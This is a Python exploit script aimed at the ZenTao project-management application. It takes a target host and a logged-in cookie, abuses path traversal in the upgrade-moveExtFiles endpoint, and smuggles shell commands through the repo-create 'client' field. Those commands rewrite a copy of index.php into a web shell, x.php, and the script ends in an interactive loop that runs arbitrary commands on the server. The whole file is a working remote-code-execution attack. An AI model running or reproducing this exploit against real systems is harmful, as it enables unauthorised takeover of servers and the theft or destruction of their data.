import gnureadline, requests, re

host = '172.31.241.55'

def askForHost():
    global host
    host = input("Give me target's host (e.g. 172.31.241.55): ")

def askForCookie():
    global cookie
    print("Note: cookie should be complete which cannot be obtained using document.cookie")
    cookie = input("Login and give me your cookie: ")

def getStatusFileName():
    print("Try to get status file name...")
    global host, cookie
    headers = {
        'Cookie': cookie,
        'Origin': 'http://{host}'.format(host=host),
        'Referer': 'http://{host}/zentao/user-login-L3plbnRhby8=.html'.format(host=host),
    }

    data = {
        'SCM': 'Gitea',
        'client': 'test',
        'name': 'test',
        'encoding': 'test',
        'product': 'test',
        'encrypt': 'base64',
        'password': 'dGVzdAo=',
        'serviceProject': 'test'
    }

    response = requests.post('http://{host}/zentao/repo-create-1?HTTP_X_REQUESTED_WITH=XMLHttpRequest'.format(host=host), headers=headers, data=data)

    try:
        r = re.search(r"(version_[0-9a-z]+.log)", response.text)
        filename = r.group(1)
        print("Get status file name successed: {filename}".format(filename=filename))
        return filename
    except:
        print("Get status file name failed.")
        exit()

def createStatusFile(filename):
    print("Try to create {filename}...".format(filename=filename))
    global host, cookie
    headers = {
        'Cookie': cookie,
        'Origin': 'http://{host}'.format(host=host),
        'Referer': 'http://{host}/zentao/user-login-L3plbnRhby8=.html'.format(host=host),
    }

    data = {
        'files[0]': '../../tmp/log/{filename}/test'.format(filename=filename),
    }

    requests.post('http://{host}/zentao/upgrade-moveExtFiles-1'.format(host=host), headers=headers, data=data)
    print("Create status file finished.")

def useLimitExecWriteShell():
    print("Try to write shell...")
    global host, cookie
    headers = {
        'Cookie': cookie,
        'Origin': 'http://{host}'.format(host=host),
        'Referer': 'http://{host}/zentao/user-login-L3plbnRhby8=.html'.format(host=host),
    }

    data = {
        'SCM': 'Subversion',
        'name': 'test',
        'encoding': 'test',
        'product': 'test',
        'encrypt': 'base64',
        'password': 'dGVzdAo=',
        'serviceProject': 'test',
        'client': "cp\t../../../htdocs/index.php\t../../www/y.php\t--context=\r\nsed\t-i\t's/isset/system/g'\t../../www/y.php\t--in-place=\r\nmv\t../../www/x.php\t../../www/x.php.bak\t--suffix=\r\nmv\t../../www/y.php\t../../www/x.php\t--suffix=\r\n",
    }

    requests.post('http://{host}/zentao/repo-create-1'.format(host=host), headers=headers, data=data)

def execShell(cmd):
    global host
    response = requests.get("http://{host}/zentao/x.php?mode={cmd}".format(host=host, cmd=cmd))
    commandreslines = []
    for line in response.text.split('\n'):
        if line.startswith('<html xmlns='):
            break
        commandreslines.append(line)
    if len(commandreslines) % 8 == 0:
        commandreslines = commandreslines[0:len(commandreslines)//8]
    return '\n'.join(commandreslines)

def checkShellExists():
    res = execShell('echo test')
    if 'test' in res:
        print('Shell already exists.')
        return True
    else:
        return False

if __name__ == "__main__":
    askForHost()
    askForCookie()

    if not checkShellExists():
        statusFileName = getStatusFileName()
        createStatusFile(statusFileName)
        useLimitExecWriteShell()
    
    while True:
        cmd = input('>>> ')
        print(execShell(cmd))